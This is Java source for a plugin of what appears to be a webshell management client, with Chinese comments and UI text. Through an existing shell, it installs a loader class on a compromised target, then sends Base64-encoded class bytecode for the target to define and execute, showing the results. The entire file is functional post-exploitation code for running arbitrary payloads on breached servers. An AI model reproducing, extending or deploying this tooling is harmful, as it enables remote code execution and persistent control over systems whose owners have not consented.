package shells.plugins.dc;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import gz.dynamiccode.ClassInfo;
import gz.dynamiccode.Codec;
import gz.dynamiccode.LoaderBridge;
import util.Log;
import util.automaticBindClick;
import util.functions;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * 动态代码执行插件。
 *
 * <p>输入 Base64 编码的 class 字节码，在目标端通过 defineClass 加载并执行。
 * 两段式操作：先「安装」加载器，再「运行」目标 class。
 */
@PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "DynamicCode", DisplayName = "动态代码执行")
public class DynamicCodePlugin implements Plugin {

    /** 目标端加载器的类名（随 jar 根目录一起下发）。 */
    private static final String LOADER_NAME = "LoaderUtil";
    private static final int MAX_CLASS_BYTES = 16 * 1024 * 1024;

    private static final String[] LOADER_LABELS = new String[]{
            "系统类加载器 System ClassLoader",
            "线程上下文类加载器 CurrentThread ClassLoader",
            "临时类加载器 Temp ClassLoader",
            "自动回退 Auto"
    };
    private static final int[] LOADER_TYPES = new int[]{0, 1, 2, 3};

    private final JPanel panel = new JPanel(new BorderLayout());

    private final JButton installButton = new JButton("安装");
    private final JButton runButton = new JButton("运行");
    private final JButton importButton = new JButton("导入 class");
    private final JButton clearButton = new JButton("清空");
    private final JComboBox loaderBox = new JComboBox(LOADER_LABELS);
    private final JTextArea codeArea = new JTextArea(10, 50);
    private final RTextArea outputArea = new RTextArea();
    private final JSplitPane splitPane = new JSplitPane();

    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;
    private LoaderBridge bridge;

    public DynamicCodePlugin() {
        this.codeArea.setLineWrap(true);
        this.codeArea.setWrapStyleWord(true);
        this.codeArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
        this.loaderBox.setSelectedIndex(2);

        JPanel toolbar = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 4));
        toolbar.add(this.installButton);
        JLabel loaderLabel = new JLabel("ClassLoader:");
        toolbar.add(loaderLabel);
        toolbar.add(this.loaderBox);
        toolbar.add(this.runButton);
        toolbar.add(this.importButton);
        toolbar.add(this.clearButton);

        JPanel inputPanel = new JPanel(new BorderLayout(4, 4));
        inputPanel.add(new JLabel("Base64:"), BorderLayout.NORTH);
        inputPanel.add(new JScrollPane(this.codeArea), BorderLayout.CENTER);

        JPanel topPanel = new JPanel(new BorderLayout());
        topPanel.add(toolbar, BorderLayout.NORTH);
        topPanel.add(inputPanel, BorderLayout.CENTER);

        this.splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.splitPane.setDividerSize(5);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.outputArea));
        this.splitPane.setDividerLocation(0.55);

        this.panel.add(this.splitPane, BorderLayout.CENTER);
    }

    // ------------------------------------------------------------------
    // 按钮事件（automaticBindClick 按 字段名 + Click 绑定）
    // ------------------------------------------------------------------

    private void installButtonClick(ActionEvent event) {
        try {
            byte[] loader = readLoaderBytes();
            if (loader == null || loader.length == 0) {
                warn("找不到 " + LOADER_NAME + ".class 资源，jar 可能不完整");
                return;
            }
            this.bridge.reset();
            print("[*] 加载器字节码: " + loader.length + " 字节");
            print("[*] payload: " + this.payload.getClass().getName());

            if (this.bridge.install(loader)) {
                print("[+] 加载器安装成功，目标类名: " + this.bridge.getMappedName());
                dialog("加载器安装成功，可以点击「运行」", "提示", 1);
            } else {
                print("[-] 加载器安装失败");
                dialog("加载器安装失败，详情见输出区", "错误", 0);
            }
        } catch (Throwable t) {
            Log.error(t);
            print("[-] 安装异常: " + t);
            dialog("安装异常：" + t, "错误", 0);
        }
    }

    private void runButtonClick(ActionEvent event) {
        String base64 = Codec.clean(this.codeArea.getText());
        if (base64.length() == 0) {
            warn("Base64 不能为空");
            return;
        }

        byte[] classBytes;
        try {
            classBytes = Codec.decode(base64);
        } catch (Throwable t) {
            warn("Base64 解码失败：" + t.getMessage());
            return;
        }
        ClassInfo info = ClassInfo.parse(classBytes);
        if (info == null) {
            warn("不是有效的 class 文件（魔数或常量池异常）");
            return;
        }
        if (classBytes.length > MAX_CLASS_BYTES) {
            warn("class 过大：" + classBytes.length + " 字节");
            return;
        }
        if (!this.bridge.isInstalled()) {
            warn("请先点击「安装」完成加载器安装，再点击「运行」");
            return;
        }

        print("");
        print("[" + now() + "] 运行");
        print("class: " + info.getClassName() + " (" + classBytes.length + " bytes, major "
                + info.getMajorVersion() + " / " + ClassInfo.javaName(info.getMajorVersion()) + ")");
        print("ClassLoader: " + LOADER_LABELS[this.loaderBox.getSelectedIndex()]);

        long start = System.currentTimeMillis();
        try {
            byte[] raw = this.bridge.run(base64, info.getClassName(), currentLoaderType());
            if (raw == null || raw.length == 0) {
                print("[-] 目标端无返回");
                warn("目标端没有返回数据，请检查加载器安装状态与网络");
                return;
            }

            String text = decode(raw);
            print("");
            print("----- target -----");
            print(text);
            print("------------------");
            print("耗时: " + (System.currentTimeMillis() - start) + " ms");

            String status = field(text, "status");
            String selfReport = field(text, "payloadOutput");
            if (status.length() == 0) {
                print("[!] 返回内容缺少 status 字段");
                warn("返回内容不是预期格式，可能命中了缓存或返回了错误页");
                return;
            }

            if ("success".equals(status)) {
                if (looksBad(selfReport)) {
                    print("[!] 已加载，但目标自报异常：" + selfReport);
                    dialog("已加载，但目标自报异常：\n" + selfReport, "警告", 2);
                } else {
                    dialog("运行成功。" + (selfReport.length() > 0 ? "\n\n目标自报：\n" + selfReport : ""),
                            "提示", 1);
                }
            } else if ("partial".equals(status)) {
                print("[!] 已定义，但初始化/实例化未完成");
                dialog("已加载，但初始化未完成：\n" + field(text, "message"), "警告", 2);
            } else {
                String type = field(text, "errorType");
                String detail = field(text, "detail");
                print("[-] 运行失败：[" + type + "] " + field(text, "message"));
                if (detail.length() > 0) {
                    print("    各策略: " + detail);
                }
                StringBuilder msg = new StringBuilder("[").append(type).append("]\n")
                        .append(field(text, "message"));
                if (detail.length() > 0) {
                    msg.append("\n\n各策略:\n").append(detail);
                }
                dialog(msg.toString(), "错误", 0);
            }
        } catch (Throwable t) {
            Log.error(t);
            print("[-] 运行异常: " + t);
            dialog("运行异常：" + t, "错误", 0);
        }
    }

    private void importButtonClick(ActionEvent event) {
        JFileChooser chooser = new JFileChooser();
        chooser.setDialogTitle("选择 class 文件");
        if (chooser.showOpenDialog(this.panel) != JFileChooser.APPROVE_OPTION) {
            return;
        }
        File file = chooser.getSelectedFile();
        try {
            byte[] data = readFile(file);
            if (ClassInfo.isClassFile(data)) {
                this.codeArea.setText(Codec.encode(data));
                print("[*] 已导入 " + file.getName() + "（" + data.length + " 字节）");
            } else {
                this.codeArea.setText(Codec.text(data).trim());
                print("[*] 已按文本导入 " + file.getName());
            }
        } catch (Throwable t) {
            print("[-] 读取失败: " + t);
            dialog("读取文件失败：" + t, "错误", 0);
        }
    }

    private void clearButtonClick(ActionEvent event) {
        this.codeArea.setText("");
        this.outputArea.setText("");
    }

    // ------------------------------------------------------------------
    // Plugin
    // ------------------------------------------------------------------

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(shellEntity);
        this.bridge = new LoaderBridge(this.payload, LOADER_NAME);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }

    // ------------------------------------------------------------------
    // 工具
    // ------------------------------------------------------------------

    private int currentLoaderType() {
        int index = this.loaderBox.getSelectedIndex();
        if (index < 0 || index >= LOADER_TYPES.length) {
            return 2;
        }
        return LOADER_TYPES[index];
    }

    private byte[] readLoaderBytes() {
        InputStream in = null;
        try {
            in = getClass().getResourceAsStream("/" + LOADER_NAME + ".class");
            if (in != null) {
                return functions.readInputStream(in);
            }
        } catch (Throwable ignored) {
            // 继续尝试
        } finally {
            close(in);
        }
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            if (cl != null) {
                in = cl.getResourceAsStream(LOADER_NAME + ".class");
                if (in != null) {
                    return functions.readInputStream(in);
                }
            }
        } catch (Throwable ignored) {
            // ignore
        } finally {
            close(in);
        }
        return null;
    }

    private String decode(byte[] raw) {
        try {
            String text = new String(raw, "UTF-8");
            if (text.indexOf('\uFFFD') < 0) {
                return text;
            }
        } catch (Throwable ignored) {
            // ignore
        }
        try {
            String text = this.encoding.Decoding(raw);
            if (text != null && text.length() > 0) {
                return text;
            }
        } catch (Throwable ignored) {
            // ignore
        }
        return new String(raw);
    }

    private static String field(String text, String key) {
        if (text == null) {
            return "";
        }
        String prefix = key + "=";
        int start = text.indexOf(prefix);
        if (start < 0) {
            return "";
        }
        start += prefix.length();
        int end = text.indexOf('\n', start);
        return (end < 0 ? text.substring(start) : text.substring(start, end)).trim();
    }

    private static boolean looksBad(String text) {
        if (text == null || text.length() == 0) {
            return false;
        }
        String lower = text.toLowerCase();
        return lower.indexOf("error") >= 0 || lower.indexOf("exception") >= 0
                || lower.indexOf("fail") >= 0 || text.indexOf("异常") >= 0
                || text.indexOf("失败") >= 0;
    }

    private static byte[] readFile(File file) throws Exception {
        FileInputStream in = new FileInputStream(file);
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            int len;
            while ((len = in.read(buf)) != -1) {
                out.write(buf, 0, len);
            }
            return out.toByteArray();
        } finally {
            close(in);
        }
    }

    private static void close(InputStream in) {
        if (in != null) {
            try {
                in.close();
            } catch (Throwable ignored) {
                // ignore
            }
        }
    }

    private void print(String text) {
        this.outputArea.append(text + "\n");
    }

    private void warn(String text) {
        print("[-] " + text);
        dialog(text, "错误", 0);
    }

    private void dialog(String message, String title, int type) {
        GOptionPane.showMessageDialog(this.panel, message, title, type);
    }

    private static String now() {
        return new SimpleDateFormat("HH:mm:ss").format(new Date());
    }
}
